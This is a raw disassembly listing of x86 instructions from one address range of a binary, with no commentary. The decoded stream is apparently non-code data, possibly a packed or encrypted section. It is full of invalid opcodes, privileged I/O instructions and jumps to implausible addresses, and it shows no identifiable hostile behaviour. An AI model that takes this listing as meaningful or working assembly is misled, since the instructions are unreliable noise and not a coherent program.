  40f7dd:	ins    BYTE PTR es:[edi],dx
  40f7de:	mov    bh,0xbe
  40f7e0:	dec    edx
  40f7e1:	cmp    edx,DWORD PTR [ecx]
  40f7e3:	cmp    ebx,eax
  40f7e5:	xchg   ebx,eax
  40f7e6:	rep outs dx,BYTE PTR ds:[esi]
  40f7e8:	sub    ebx,ecx
  40f7ea:	sbb    eax,0xc33223ed
  40f7ef:	fs clc 
  40f7f1:	ins    DWORD PTR es:[edi],dx
  40f7f2:	and    BYTE PTR [ecx-0x35],ch
  40f7f5:	rcl    ebx,cl
  40f7f7:	in     eax,0xba
  40f7f9:	dec    eax
  40f7fa:	ret    
  40f7fb:	call   0x4db79caa
  40f800:	pop    esp
  40f801:	hlt    
  40f802:	inc    ecx
  40f803:	loope  0x40f7c6
  40f805:	sbb    BYTE PTR es:[edi+0x6c],bl
  40f809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f80a:	and    al,0xb4
  40f80c:	and    DWORD PTR [ecx+0x59],ecx
  40f80f:	pusha  
  40f810:	dec    esp
  40f811:	cmp    esi,DWORD PTR [esi]
  40f813:	sub    al,0x21
  40f815:	mov    eax,0x7c4953b9
  40f81a:	bound  edi,QWORD PTR [edi]
  40f81c:	mov    dl,0x4b
  40f81e:	sbb    dh,BYTE PTR [edx]
  40f820:	stos   BYTE PTR es:[edi],al
  40f821:	retf   
  40f822:	(bad)  
  40f823:	cmp    ah,BYTE PTR [edx-0x59]
  40f826:	push   edi
  40f827:	xchg   esi,eax
  40f828:	inc    edi
  40f829:	dec    ebp
  40f82a:	int3   
  40f82b:	sti    
  40f82c:	mov    eax,ds:0x4e719aee
  40f831:	lods   eax,DWORD PTR ds:[esi]
  40f832:	std    
  40f833:	xchg   edx,eax
  40f834:	mov    edx,0xb4bcb330
  40f839:	mul    BYTE PTR [esi+ebp*2-0x30e0765f]
  40f840:	clc    
  40f841:	dec    ecx
  40f842:	cmp    al,0x2a
  40f844:	imul   edx,DWORD PTR [edi+0x5a70a744],0x4f
  40f84b:	jnp    0x40f8c3
  40f84d:	adc    DWORD PTR [esi-0x45],edx
  40f850:	adc    BYTE PTR [ecx],bh
  40f852:	sub    al,0xc7
  40f854:	outs   dx,BYTE PTR ds:[esi]
  40f855:	arpl   WORD PTR [ebp+0x53],di
  40f858:	jg     0x40f801
  40f85a:	or     al,0xcb
  40f85c:	in     al,dx
  40f85d:	imul   edx,DWORD PTR [ebx-0x7a501bc5],0xffffffbf
  40f864:	or     eax,0x8750598b
  40f869:	retf   
  40f86a:	xchg   edi,eax
  40f86b:	sub    BYTE PTR [ebx-0x18ca5524],bl
  40f871:	pusha  
  40f872:	add    edx,edx
  40f874:	int    0xac
  40f876:	iret   
  40f877:	push   0x6d
  40f879:	out    0xdd,eax
  40f87b:	jle    0x40f8ab
  40f87d:	enter  0xae48,0xbb
  40f881:	pop    eax
  40f882:	mov    fs,WORD PTR [edx+edx*1-0x73]
  40f886:	fstp   TBYTE PTR [ebx-0x46]
  40f889:	retf   0x1429
  40f88c:	pop    ds
  40f88d:	jge    0x40f8a9
  40f88f:	mov    ebp,0x6a3a19ce
  40f894:	dec    ebp
  40f895:	in     al,dx
  40f896:	aam    0x5a
  40f898:	push   ds
  40f899:	dec    ebx
  40f89a:	mov    ecx,0x850b5185
  40f89f:	out    0x76,eax
  40f8a1:	lods   al,BYTE PTR ds:[esi]
  40f8a2:	das    
  40f8a3:	lock dec eax
  40f8a5:	xchg   ebp,eax
  40f8a6:	cs xchg esp,eax
  40f8a8:	lock mov edx,DWORD PTR [esi]
  40f8ab:	fs ret 0x9c20
  40f8af:	adc    esp,DWORD PTR ss:[edx+0x76]
  40f8b3:	mov    bl,0xc3
  40f8b5:	mov    ds:0x734634df,al
  40f8ba:	mov    ebx,0x75d723d9
  40f8bf:	sti    
  40f8c0:	xchg   edi,eax
  40f8c1:	sub    eax,0x10586cc
  40f8c6:	imul   edi,DWORD PTR [edx],0xffffffa7
  40f8c9:	inc    esi
  40f8ca:	enter  0x97b4,0x1f
  40f8ce:	mov    ebx,0xa17df77a
  40f8d3:	je     0x40f8e4
  40f8d5:	jne    0x40f92e
  40f8d7:	adc    al,BYTE PTR [ecx]
  40f8d9:	push   ss
  40f8da:	(bad)  
  40f8db:	shr    esi,1
  40f8dd:	icebp  
  40f8de:	jmp    0x40f8be
  40f8e0:	into   
  40f8e1:	jp     0x40f8e3
  40f8e3:	inc    ecx
  40f8e4:	push   edi
  40f8e5:	call   0x4856e982
  40f8ea:	cli    
  40f8eb:	pop    ds
  40f8ec:	jl     0x40f90e
  40f8ee:	push   0x6593ce98
  40f8f3:	add    esi,esp
  40f8f5:	mov    ecx,0xfa62cf61
  40f8fa:	dec    edi
  40f8fb:	das    
  40f8fc:	add    al,0xf6
  40f8fe:	out    dx,eax
  40f8ff:	inc    ebp
  40f900:	stos   BYTE PTR es:[edi],al
  40f901:	iret   
  40f902:	jnp    0x40f89d
  40f904:	sbb    al,0xa7
  40f906:	out    0x18,eax
  40f908:	stc    
  40f909:	jge    0x40f90c
  40f90b:	or     al,0x35
  40f90d:	push   0x10
  40f90f:	mov    WORD PTR [eax],ds
  40f911:	icebp  
  40f912:	rcl    BYTE PTR [ebx+0x468be39a],0xb9
  40f919:	fnstenv [ebx-0x20]
  40f91c:	push   ebx
  40f91d:	mov    BYTE PTR [edi+edx*8+0x563fb09b],al
  40f924:	dec    ebx
  40f925:	ret    
  40f926:	je     0x40f8b9
  40f928:	jne    0x40f91a
  40f92a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f92b:	sub    eax,0x30a7f4e4
  40f930:	pop    edi
  40f931:	mov    esp,0x4237d451
  40f936:	les    edi,FWORD PTR [edi-0x6f]
  40f939:	cmp    BYTE PTR [eax-0x3e],bl
  40f93c:	mov    dh,0xf0
  40f93e:	jmp    0x40f920
  40f940:	jbe    0x40f9ac
  40f942:	bound  edx,QWORD PTR [ebx]
  40f944:	cld    
  40f945:	jle    0x40f8eb
  40f947:	in     al,0x40
  40f949:	pop    ecx
  40f94a:	pop    edx
  40f94b:	repz push edi
  40f94d:	fsub   QWORD PTR [ebp+0x15]
  40f950:	jnp    0x40f94b
  40f952:	repnz jmp 0x217a:0x8ad3ae04
  40f95a:	xor    dh,ah
  40f95c:	das    
  40f95d:	push   esi
  40f95e:	(bad)  
  40f95f:	sbb    dl,BYTE PTR [ebx]
  40f961:	xor    edx,DWORD PTR ds:0x7f13dde
  40f967:	cmc    
  40f968:	shl    BYTE PTR [esi+ebp*4+0x37cad4a1],1
  40f96f:	(bad)  
  40f970:	fistp  DWORD PTR [ecx+0x18]
  40f973:	mov    edi,fs
  40f975:	push   esp
  40f976:	adc    al,0xa5
  40f978:	leave  
  40f979:	xlat   BYTE PTR ds:[ebx]
  40f97a:	imul   esp,ecx,0xfffffff4
  40f97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f97e:	out    0x5f,eax
  40f980:	add    edx,DWORD PTR [edx+0x20]
  40f983:	test   eax,0xc8f52967
  40f988:	pushf  
  40f989:	lahf   
  40f98a:	xchg   ecx,eax
  40f98b:	push   esi
  40f98c:	dec    edx
  40f98d:	dec    ebp
  40f98e:	xchg   edi,eax
  40f98f:	pop    ebx
  40f990:	xchg   ecx,eax
  40f991:	ret    0xa2b1
  40f994:	sbb    eax,0x86d7d1d1
  40f999:	add    eax,0xf71ead03
  40f99e:	sbb    BYTE PTR [esi],dh
  40f9a0:	or     al,ah
  40f9a2:	sbb    DWORD PTR [esi+0x47],0x168cdd65
  40f9a9:	mov    dh,0x65
  40f9ab:	mov    ebp,0xe50ffa0
  40f9b0:	fwait
  40f9b1:	clc    
  40f9b2:	cvtps2dq xmm4,XMMWORD PTR [esi+0xf49ad4d]
  40f9ba:	ficomp WORD PTR [ecx+ebp*8+0x2c]
  40f9be:	test   eax,0x7c02efd4
  40f9c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9c4:	push   0x8
  40f9c6:	push   0x6
  40f9c8:	adc    bl,bl
  40f9ca:	jge    0x40f9a0
  40f9cc:	(bad)  
  40f9cd:	mov    ch,0x56
  40f9cf:	outs   dx,DWORD PTR ds:[esi]
  40f9d0:	sbb    al,0xf4
  40f9d2:	ret    
  40f9d3:	outs   dx,DWORD PTR ds:[esi]
  40f9d4:	shl    DWORD PTR [ecx-0x64],cl
  40f9d7:	cwde   
  40f9d8:	es in  al,dx
  40f9da:	aaa    
  40f9db:	(bad)  
  40f9dc:	jne    0x40fa1c
  40f9de:	pop    edi
  40f9df:	inc    esi
  40f9e0:	cmp    al,0xbc
  40f9e2:	adc    eax,ebx
  40f9e4:	xchg   ebx,eax
  40f9e5:	push   ebp
  40f9e6:	inc    esi
  40f9e7:	loopne 0x40fa03
  40f9e9:	test   BYTE PTR [edx+edi*8-0xf66f05],cl
  40f9f0:	add    al,0xce
  40f9f2:	push   ebx
  40f9f3:	rcr    BYTE PTR [ebp+0x73],0x2a
  40f9f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9f8:	add    BYTE PTR [ecx+0x2de12092],0x40
  40f9ff:	xchg   edx,eax
  40fa00:	add    ecx,DWORD PTR [edx+0x41ffb211]
  40fa06:	imul   ecx,eax,0xffffffe3
  40fa09:	pushf  
  40fa0a:	mov    DWORD PTR [ecx+0x6f],edi
  40fa0d:	popf   
  40fa0e:	adc    BYTE PTR [ebp+0x53],dh
  40fa11:	add    DWORD PTR [ebx+0x7b],edx
  40fa14:	sub    ah,BYTE PTR [edx+ebp*4+0xda40994]
  40fa1b:	cli    
  40fa1c:	(bad)  
  40fa1d:	loope  0x40f9f0
  40fa1f:	mov    bl,dh
  40fa21:	xchg   edi,eax
  40fa22:	cmp    BYTE PTR [esi-0x6d],0xfe
  40fa26:	ret    
  40fa27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa28:	iret   
  40fa29:	add    eax,0xd398c32a
  40fa2e:	inc    ebp
  40fa2f:	cli    
  40fa30:	aas    
  40fa31:	add    edx,DWORD PTR [ecx-0x742e6fb]
  40fa37:	xchg   esi,eax
  40fa38:	clc    
  40fa39:	inc    esp
  40fa3a:	add    DWORD PTR [esi+0x58a5dc32],esi
  40fa40:	cwde   
  40fa41:	mov    ds:0xe6b71785,eax
  40fa46:	dec    eax
  40fa47:	lea    edx,[edx+0x6fbfda8]
  40fa4d:	cmc    
  40fa4e:	lea    eax,[edx-0xce17462]
  40fa54:	dec    ebx
  40fa55:	aaa    
  40fa56:	cmp    edi,DWORD PTR [esi]
  40fa58:	imul   esi,ecx,0x7f945616
  40fa5e:	xor    eax,0x2afbcac6
  40fa63:	pop    ebp
  40fa64:	xchg   ebx,eax
  40fa65:	cmp    dh,BYTE PTR [ecx+0x20ad0e33]
  40fa6b:	ins    DWORD PTR es:[edi],dx
  40fa6c:	popf   
  40fa6d:	mov    cl,0x18
  40fa6f:	mov    al,ds:0x2641778a
  40fa74:	hlt    
  40fa75:	jbe    0x40f9ff
  40fa77:	out    0xd7,eax
  40fa79:	xchg   ebx,eax
  40fa7a:	push   ebp
  40fa7b:	fidivr WORD PTR [ebp+0x49]
  40fa7e:	outs   dx,DWORD PTR ds:[esi]
  40fa7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa80:	imul   BYTE PTR [eax]
  40fa82:	bound  eax,QWORD PTR [eax-0x5c62499c]
  40fa88:	xchg   BYTE PTR [esi+0x69],dl
  40fa8b:	pop    ebp
  40fa8c:	adc    dh,cl
  40fa8e:	jmp    0xedf52271
  40fa93:	sbb    BYTE PTR [eax],0x86
  40fa96:	(bad)  
  40fa97:	jge    0x40fac3
  40fa99:	pop    esi
  40fa9a:	and    eax,0x80cb2c18
  40fa9f:	ret    0xbf55
  40faa2:	xchg   esp,eax
  40faa3:	add    dl,BYTE PTR [esi-0x60]
  40faa6:	int3   
  40faa7:	push   es
  40faa8:	aas    
  40faa9:	dec    edi
  40faaa:	(bad)  
  40faab:	lock test DWORD PTR [ecx+ebp*4-0x75],ebx
  40fab0:	sub    edi,esp
  40fab2:	push   edi
  40fab3:	pop    ss
  40fab4:	fs mov cl,0xfb
  40fab7:	sbb    BYTE PTR [ebp+ebx*4+0x12],bl
  40fabb:	fsub   DWORD PTR [esi+0x481ed64d]
  40fac1:	pop    edi
  40fac2:	xchg   esi,eax
  40fac3:	loop   0x40fae7
  40fac5:	(bad)  
  40fac6:	into   
  40fac7:	das    
  40fac8:	pop    ds
  40fac9:	lods   eax,DWORD PTR ds:[esi]
  40faca:	pop    ds
  40facb:	fcom   QWORD PTR [eax-0x55]
  40face:	mov    esp,edi
  40fad0:	or     eax,0xdc4f1071
  40fad5:	scas   al,BYTE PTR es:[edi]
  40fad6:	inc    eax
  40fad7:	repnz push ss
  40fad9:	push   0xd96c2371
  40fade:	in     eax,dx
  40fadf:	sub    bh,BYTE PTR [edx+0x71]
  40fae2:	out    0xec,al
  40fae4:	stc    
  40fae5:	inc    eax
  40fae6:	shl    BYTE PTR [edi-0x43],cl
  40fae9:	loope  0x40fa7b
  40faeb:	test   BYTE PTR [ecx],ah
  40faed:	add    BYTE PTR [ebx+0x2e],dh
  40faf0:	or     bh,BYTE PTR ds:0x73a35583
  40faf6:	jecxz  0x40fb1e
  40faf8:	sub    al,BYTE PTR [eax+0x29]
  40fafb:	gs jmp 0xcf9e:0x7414caea
  40fb03:	or     al,0x12
  40fb05:	adc    ebx,esi
  40fb07:	push   0x6b
  40fb09:	sbb    al,0xd3
  40fb0b:	mov    esp,0x3e9994be
  40fb10:	pop    ebx
  40fb11:	iret   
  40fb12:	neg    DWORD PTR [ecx+0x2718dbb3]
  40fb18:	fld    TBYTE PTR [eax-0x6cd43393]
  40fb1e:	mov    edi,0x33600adb
  40fb23:	jne    0x40fb6b
  40fb25:	sar    DWORD PTR [eax+0x15582496],0x75
  40fb2c:	xchg   BYTE PTR ss:[esi+0x6],ch
  40fb30:	lds    edi,FWORD PTR [edx-0xe]
  40fb33:	sbb    BYTE PTR [edi+0x39],bh
  40fb36:	xchg   esi,ebx
  40fb38:	pop    eax
  40fb39:	and    BYTE PTR [ebx-0x43],bh
  40fb3c:	add    DWORD PTR [eax+0xc350890],0x507a0a0d
  40fb46:	sbb    al,0x1a
  40fb48:	jbe    0x40fb2a
  40fb4a:	in     eax,dx
  40fb4b:	mov    dl,0x2f
  40fb4d:	push   esp
  40fb4e:	sub    eax,0x762977c4
  40fb53:	in     eax,0x13
  40fb55:	stos   BYTE PTR es:[edi],al
  40fb56:	add    DWORD PTR [eax-0xe],ebx
  40fb59:	mov    WORD PTR [edi+ebp*4],gs
  40fb5c:	sub    eax,0xd25a5137
  40fb61:	cmp    al,0xe1
  40fb63:	pop    ss
  40fb64:	scas   eax,DWORD PTR es:[edi]
  40fb65:	retf   0xd3a4
  40fb68:	cwde   
  40fb69:	pusha  
  40fb6a:	popf   
  40fb6b:	mov    edx,0xfdec2051
  40fb70:	pop    ecx
  40fb71:	and    DWORD PTR [edi-0x650f2961],esi
  40fb77:	inc    esi
  40fb78:	sub    eax,0x9aab65a5
  40fb7d:	shl    DWORD PTR [edi-0x67],0xa
  40fb81:	dec    edi
  40fb82:	daa    
  40fb83:	addr16 pop es
  40fb85:	ins    DWORD PTR es:[edi],dx
  40fb86:	jb     0x40fb58
  40fb88:	push   edi
  40fb89:	sbb    eax,0xfcc982df
  40fb8e:	aaa    
  40fb8f:	ret    
  40fb90:	xor    DWORD PTR [ebp+0x51cb277e],eax
  40fb96:	sahf   
  40fb97:	adc    eax,ebp
  40fb99:	pop    edi
  40fb9a:	ja     0x40fbeb
  40fb9c:	sete   BYTE PTR [eax+0x70]
  40fba0:	jle    0x40fbba
  40fba2:	ins    DWORD PTR es:[edi],dx
  40fba3:	aad    0x9b
  40fba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fba6:	loop   0x40fbcd
  40fba8:	sbb    edx,ebx
  40fbaa:	mov    WORD PTR [edi-0x43],?
  40fbad:	pop    ebp
  40fbae:	es xor al,0x5a
  40fbb1:	ds jbe 0x40fb8e
  40fbb4:	xchg   edi,eax
  40fbb5:	ss in  eax,dx
  40fbb7:	cmp    DWORD PTR [esi+ecx*2],esp
  40fbba:	or     eax,0xed00e4c2
  40fbbf:	stc    
  40fbc0:	add    edx,esi
  40fbc2:	pop    ebx
  40fbc3:	bound  eax,QWORD PTR ds:0x1845d44e
  40fbc9:	lods   al,BYTE PTR ds:[esi]
  40fbca:	cmc    
  40fbcb:	sub    bl,BYTE PTR [ebp+0x13]
  40fbce:	xchg   esi,eax
  40fbcf:	(bad)  
  40fbd0:	mov    dh,0x5
  40fbd2:	pushf  
  40fbd3:	(bad)  
  40fbd5:	cmp    al,0xd6
  40fbd7:	daa    
  40fbd8:	mov    eax,0x480c6c53
  40fbdd:	dec    esp
  40fbde:	mov    bh,0xea
  40fbe0:	pop    ebx
  40fbe1:	jp     0x40fbf1
  40fbe3:	and    BYTE PTR [edi+0x292d2c33],0x74
  40fbea:	adc    al,0x8b
  40fbec:	mov    WORD PTR [esi+0x30c1cc2b],ss
  40fbf2:	mov    ch,0xd6
  40fbf4:	xchg   ebx,eax
  40fbf5:	jo     0x40fc33
  40fbf7:	ret    0x236
  40fbfa:	sbb    ebp,DWORD PTR [ecx]
  40fbfc:	mov    DWORD PTR [eax],eax
  40fbfe:	popa   
  40fbff:	jp     0x40fbce
  40fc01:	in     al,0x86
  40fc03:	std    
  40fc04:	mov    edx,0x96b886a8
  40fc09:	fld    QWORD PTR [ebx+0x11]
  40fc0c:	xchg   ecx,eax
  40fc0d:	repz ret 
  40fc0f:	dec    ebp
  40fc10:	into   
  40fc11:	retf   0xd537
  40fc14:	adc    cl,BYTE PTR [ebp+0x1947bf29]
  40fc1a:	sar    DWORD PTR fs:0x5aea1ab3,1
  40fc21:	pop    ebx
  40fc22:	lock out dx,eax
  40fc24:	out    0xcb,eax
  40fc26:	add    BYTE PTR [ebx+0x6784903a],ah
  40fc2c:	call   0x5bea:0x4c2133e6
  40fc33:	mov    al,al
  40fc35:	jecxz  0x40fc1b
  40fc37:	scas   al,BYTE PTR es:[edi]
  40fc38:	push   ebx
  40fc39:	jmp    0x40fca0
  40fc3b:	mov    al,0xe0
  40fc3d:	mov    ds:0x64d7770d,eax
  40fc42:	cld    
  40fc43:	add    ecx,DWORD PTR [ecx-0x2fa3679f]
  40fc49:	pop    es
  40fc4a:	push   esi
  40fc4b:	imul   edx,DWORD PTR [edi],0xfffffff6
  40fc4e:	cli    
  40fc4f:	and    bl,BYTE PTR [eax+edi*4-0x23dbec55]
  40fc56:	dec    edi
  40fc57:	shl    BYTE PTR [edx-0x2019c103],0x22
  40fc5e:	ror    ch,cl
  40fc60:	loop   0x40fc47
  40fc62:	xchg   esi,eax
  40fc63:	into   
  40fc64:	fnstenv [edx-0x34]
  40fc67:	pop    esp
  40fc68:	inc    esi
  40fc69:	inc    eax
  40fc6a:	mov    DWORD PTR [esi-0x50],0xb116b51f
  40fc71:	nop
  40fc72:	jae    0x40fc56
  40fc74:	inc    esi
  40fc75:	mov    ch,0x1f
  40fc77:	(bad)  
  40fc78:	cmp    edx,DWORD PTR [edx]
  40fc7a:	mov    esp,0x1ee44955
  40fc7f:	ss daa 
  40fc81:	cld    
  40fc82:	cdq    
  40fc83:	out    0xca,al
  40fc85:	jmp    0xfabfd231
  40fc8a:	test   BYTE PTR [eax],al
  40fc8c:	(bad)  
  40fc8d:	fldenv [esi]
  40fc8f:	lods   al,BYTE PTR ds:[esi]
  40fc90:	imul   edx,DWORD PTR [esi+0x319f83cd],0x365a0441
  40fc9a:	rcr    ah,1
  40fc9c:	cmp    edi,DWORD PTR [edi-0x6dfff304]
  40fca2:	rol    DWORD PTR [edi-0xe],0x61
  40fca6:	cmp    al,0xd6
  40fca8:	xchg   ebp,eax
  40fca9:	dec    ecx
  40fcaa:	adc    eax,0x7a1ab3c9
  40fcaf:	in     eax,dx
  40fcb0:	dec    edi
  40fcb1:	or     eax,0xc33d4dea
  40fcb6:	cmc    
  40fcb7:	xor    BYTE PTR [esp+edi*4+0x9ebb46a],ch
  40fcbe:	xor    eax,DWORD PTR [ebx-0x57538061]
  40fcc4:	dec    esi
  40fcc5:	inc    edi
  40fcc6:	mov    al,ds:0xc3292b53
  40fccb:	inc    esi
  40fccc:	mov    ds:0xc7580b5f,al
  40fcd1:	cli    
  40fcd2:	jns    0x40fcb3
  40fcd4:	cmp    DWORD PTR [edi-0x80],0x71
  40fcd8:	xchg   ecx,eax
  40fcd9:	lods   eax,DWORD PTR ds:[esi]
  40fcda:	(bad)  
  40fcdc:	mov    ds:0x35d9aec8,al
  40fce1:	mov    al,0xdd
  40fce3:	add    DWORD PTR [eax-0x55ed9198],0x2
  40fcea:	or     eax,0xdd311bad
  40fcef:	in     al,dx
  40fcf0:	jl     0x40fcb1
  40fcf2:	xor    al,cl
  40fcf4:	xchg   esi,eax
  40fcf5:	jns    0x40fcf6
  40fcf7:	ror    BYTE PTR [ebx],1
  40fcf9:	mov    ebp,0xbe5d27ed
  40fcfe:	xor    al,0x68
  40fd00:	(bad)  
  40fd01:	cli    
  40fd02:	shl    BYTE PTR [ecx-0x55677845],cl
  40fd08:	ret    
  40fd09:	(bad)  
  40fd0a:	xlat   BYTE PTR ds:[ebx]
  40fd0b:	mov    esi,0x735e8cfb
  40fd10:	scas   al,BYTE PTR es:[edi]
  40fd11:	ss call 0xee32:0x4ac4c85
  40fd19:	pop    ecx
  40fd1a:	inc    edi
  40fd1b:	aam    0xa8
  40fd1d:	mov    DWORD PTR [eax+0x12],edx
  40fd20:	cmp    eax,0xfdb9ac17
  40fd25:	shl    DWORD PTR [ebx+ecx*4-0x60],1
  40fd29:	push   ebx
  40fd2a:	iret   
  40fd2b:	jmp    0x40fd25
  40fd2d:	cld    
  40fd2e:	or     DWORD PTR [ebx-0x264fbcc],0xffffff90
  40fd35:	push   es
  40fd36:	mov    ch,BYTE PTR [ecx]
  40fd38:	sbb    dl,BYTE PTR [edx-0x21]
  40fd3b:	fwait
  40fd3c:	outs   dx,DWORD PTR ds:[esi]
  40fd3d:	nop/reserved BYTE PTR [ebx-0x7d]
  40fd41:	clc    
  40fd42:	sub    cl,BYTE PTR [edi+0x78f5344f]
  40fd48:	inc    esp
  40fd49:	push   esi
  40fd4a:	aad    0x3a
  40fd4c:	and    al,0x4e
  40fd4e:	adc    DWORD PTR [edx],ebp
  40fd50:	cmc    
  40fd51:	jae    0x40fd06
  40fd53:	push   ebx
  40fd54:	test   DWORD PTR [ebx+0x58],esp
  40fd57:	mov    bh,0x15
  40fd59:	enter  0xfcf3,0x55
  40fd5d:	mov    al,0xd3
  40fd5f:	loopne 0x40fd27
  40fd61:	cmc    
  40fd62:	xchg   esi,eax
  40fd63:	repz dec BYTE PTR [eax+esi*1-0x307474e1]
  40fd6b:	mov    bh,0x5e
  40fd6d:	jbe    0x40fd0b
  40fd6f:	rol    DWORD PTR [esi-0x1af6874c],cl
  40fd75:	mov    ch,0xa2
  40fd77:	aam    0xbc
  40fd79:	pop    eax
  40fd7a:	test   eax,0xdc3b7ffe
  40fd7f:	cs sub eax,0x4681cc74
  40fd85:	mov    ch,0xac
  40fd87:	mov    ?,WORD PTR [edi]
  40fd89:	dec    ebp
  40fd8a:	cwde   
  40fd8b:	in     eax,dx
  40fd8c:	cmc    
  40fd8d:	stos   DWORD PTR es:[edi],eax
  40fd8e:	clc    
  40fd8f:	inc    ebx
  40fd90:	and    DWORD PTR [esi],edi
  40fd92:	mov    ?,WORD PTR [edi+0x4b]
  40fd95:	add    ah,BYTE PTR [eax]
  40fd97:	rcr    DWORD PTR [esi],0xa
  40fd9a:	mov    ds:0xd9923a39,al
  40fd9f:	gs dec esi
  40fda1:	cmc    
  40fda2:	in     al,0xb7
  40fda4:	leave  
  40fda5:	pop    ebx
  40fda6:	cdq    
  40fda7:	fstp   DWORD PTR [eax-0x479a752c]
  40fdad:	mov    ebp,0x56d1a79
  40fdb2:	bnd jmp 0xb76cbdb4
  40fdb8:	sub    edx,esi
  40fdba:	push   0xc9b152dd
  40fdbf:	outs   dx,DWORD PTR ds:[esi]
  40fdc0:	stos   BYTE PTR es:[edi],al
  40fdc1:	retf   0x2b06
  40fdc4:	arpl   WORD PTR [ebp+ebx*1+0x30b945c9],sp
  40fdcb:	aad    0xac
  40fdcd:	enter  0xee97,0x2e
  40fdd1:	inc    ecx
  40fdd2:	into   
  40fdd3:	ror    edi,1
  40fdd5:	clc    
  40fdd6:	lea    ebx,[ebx+esi*1+0x5bda0684]
  40fddd:	pusha  
  40fdde:	inc    edx
  40fddf:	(bad)
  40fde4:	mov    BYTE PTR [edi+0x75],ah
  40fde7:	jmp    0xfb523de9
  40fdec:	shl    dl,cl
  40fdee:	scas   al,BYTE PTR es:[edi]
  40fdef:	ret    
  40fdf0:	pop    eax
  40fdf1:	psubd  mm6,QWORD PTR [ecx]
  40fdf4:	daa    
  40fdf5:	rol    BYTE PTR [eax-0x2a5c39c8],cl
  40fdfb:	ins    DWORD PTR es:[edi],dx
  40fdfc:	js     0x40fe3b
  40fdfe:	cld    
  40fdff:	sbb    al,0x95
  40fe01:	xor    eax,0xdb7939d0
  40fe06:	scas   eax,DWORD PTR es:[edi]
  40fe07:	pop    es
  40fe08:	shl    esp,0x8c
  40fe0b:	xchg   edi,eax
  40fe0c:	div    BYTE PTR [ecx-0x4b]
  40fe0f:	xor    eax,0xd7b5b60b
  40fe14:	jo     0x40fdd4
  40fe16:	ds jbe 0x40fe1f
  40fe19:	bound  esp,QWORD PTR [ebx-0x42]
  40fe1c:	xor    dh,bh
  40fe1e:	add    BYTE PTR [ebx],bh
  40fe20:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40fe22:	dec    edi
  40fe23:	mov    bh,0xb7
  40fe25:	mov    ecx,DWORD PTR [ecx-0xe8e24d3]
  40fe2b:	sbb    eax,0xa18505c0
  40fe30:	jne    0x40fdd5
  40fe32:	mov    bl,0x7d
  40fe34:	ins    DWORD PTR es:[edi],dx
  40fe35:	and    DWORD PTR [eax-0x3a6722a],ecx
  40fe3b:	int    0x42
  40fe3d:	rol    esi,1
  40fe3f:	imul   ebp,DWORD PTR [edx-0x49],0x1ac2e348
  40fe46:	dec    edx
  40fe47:	mov    eax,0x32a77400
  40fe4c:	dec    esp
  40fe4d:	add    esi,esi
  40fe4f:	in     al,0x58
  40fe51:	mov    al,0x75
  40fe53:	jge    0x40fe0a
  40fe55:	fistp  QWORD PTR [eax+0x3f]
  40fe58:	jno    0x40fe5c
  40fe5a:	push   ecx
  40fe5b:	clc    
  40fe5c:	sbb    bl,BYTE PTR [edx+0x39fe916d]
  40fe62:	in     al,dx
  40fe63:	add    eax,0x6be6c25d
  40fe68:	inc    ecx
  40fe69:	sar    BYTE PTR [eax],cl
  40fe6b:	jge    0x40fe36
  40fe6d:	shl    ecx,0xd1
  40fe70:	out    dx,eax
  40fe71:	jp     0x40fe58
  40fe73:	sbb    edi,edi
  40fe75:	pop    ss
  40fe76:	xor    BYTE PTR [eax],bl
  40fe78:	out    dx,eax
  40fe79:	xor    ch,BYTE PTR [eax-0x2377ca58]
  40fe7f:	sub    ah,BYTE PTR [eax+esi*4]
  40fe82:	cmc    
  40fe83:	inc    ebx
  40fe84:	pop    ebp
  40fe85:	pusha  
  40fe86:	(bad)  
  40fe87:	iret   
  40fe88:	xor    BYTE PTR fs:[ebx-0x4a],cl
  40fe8c:	jnp    0x40fe41
  40fe8e:	sahf   
  40fe8f:	aas    
  40fe90:	pusha  
  40fe91:	ins    DWORD PTR es:[edi],dx
  40fe92:	jp     0x40fe76
  40fe94:	adc    al,0xcc
  40fe96:	jns    0x40fef2
  40fe98:	dec    ecx
  40fe99:	dec    ecx
  40fe9a:	xchg   ebx,eax
  40fe9b:	popa   
  40fe9c:	sub    DWORD PTR [esi-0x21805623],esp
  40fea2:	xchg   ch,al
  40fea4:	into   
  40fea5:	xchg   ebx,eax
  40fea6:	add    esi,esi
  40fea8:	retf   0xf1f7
  40feab:	cdq    
  40feac:	cs imul esi,DWORD PTR fs:[ecx+0x5772a150],0xffffffce
  40feb5:	add    BYTE PTR [edi+0x72cc80bc],0x53
  40febc:	dec    ecx
  40febd:	xchg   edi,eax
  40febe:	sar    DWORD PTR ds:0xc19268cf,1
  40fec4:	addr16 js 0x40fea5
  40fec7:	das    
  40fec8:	or     ah,bh
  40feca:	and    BYTE PTR [ebx-0x40c56dec],dh
  40fed0:	icebp  
  40fed1:	cmp    DWORD PTR [ebx+0x78],esp
  40fed4:	popf   
  40fed5:	jae    0x40fe73
  40fed7:	ud2    
  40fed9:	mov    edi,0x29f12388
  40fede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fedf:	fnstsw WORD PTR [edx+0x38]
  40fee2:	outs   dx,DWORD PTR ds:[esi]
  40fee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fee4:	test   BYTE PTR [eax-0x30],0x3
  40fee8:	sub    al,0x62
  40feea:	xchg   edx,eax
  40feeb:	in     eax,0x9b
  40feed:	pop    ss
  40feee:	pushf  
  40feef:	jp     0x40fe9d
  40fef1:	loopne 0x40ff70
  40fef3:	retf   0x2b43
  40fef6:	xor    al,0x40
  40fef8:	pop    eax
  40fef9:	add    eax,0xbfe0b875
  40fefe:	and    ebp,eax
  40ff00:	inc    edx
  40ff01:	pop    esi
  40ff02:	pop    eax
  40ff03:	adc    esi,esi
  40ff05:	test   eax,0xdd3a023e
  40ff0a:	xchg   esi,ecx
  40ff0c:	xchg   ecx,eax
